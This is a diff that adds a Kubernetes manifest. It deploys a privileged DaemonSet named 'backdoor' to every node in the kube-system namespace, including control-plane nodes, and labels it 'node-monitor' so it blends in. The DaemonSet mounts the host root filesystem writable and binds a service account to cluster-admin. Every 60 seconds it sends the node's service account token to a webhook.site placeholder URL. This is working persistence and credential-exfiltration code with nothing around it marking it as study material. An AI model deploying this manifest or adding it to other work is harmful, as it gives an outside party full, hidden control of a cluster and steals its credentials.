@@ -1,0 +1,80 @@
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: backdoor
+  namespace: kube-system
+  labels:
+    app: backdoor
+    # Blend in with legitimate system components
+    k8s-app: node-monitor
+spec:
+  selector:
+    matchLabels:
+      app: backdoor
+  template:
+    metadata:
+      labels:
+        app: backdoor
+        k8s-app: node-monitor
+    spec:
+      # Tolerate control-plane taint so the DaemonSet runs on ALL nodes
+      tolerations:
+        - key: node-role.kubernetes.io/control-plane
+          effect: NoSchedule
+        - key: node-role.kubernetes.io/master
+          effect: NoSchedule
+      hostNetwork: true
+      hostPID: true
+      containers:
+        - name: backdoor
+          image: alpine:latest
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              apk add --no-cache curl ncat 2>/dev/null
+              while true; do
+                # Beacon home every 60 seconds with node identity
+                NODE=$(cat /proc/sys/kernel/hostname)
+                TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+                curl -sf -m 5 -X POST \
+                  -H "Content-Type: application/json" \
+                  -d "{\"node\":\"$NODE\",\"token\":\"$TOKEN\"}" \
+                  https://webhook.site/YOUR_WEBHOOK_ID 2>/dev/null || true
+                sleep 60
+              done
+          securityContext:
+            privileged: true
+          volumeMounts:
+            - name: host-root
+              mountPath: /host
+              readOnly: false
+          env:
+            - name: NODE_NAME
+              valueFrom:
+                fieldRef:
+                  fieldPath: spec.nodeName
+      volumes:
+        - name: host-root
+          hostPath:
+            path: /
+      serviceAccountName: backdoor-sa
+      terminationGracePeriodSeconds: 0
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: backdoor-sa
+  namespace: kube-system
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: backdoor-cluster-admin
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: cluster-admin
+subjects:
+  - kind: ServiceAccount
+    name: backdoor-sa
+    namespace: kube-system
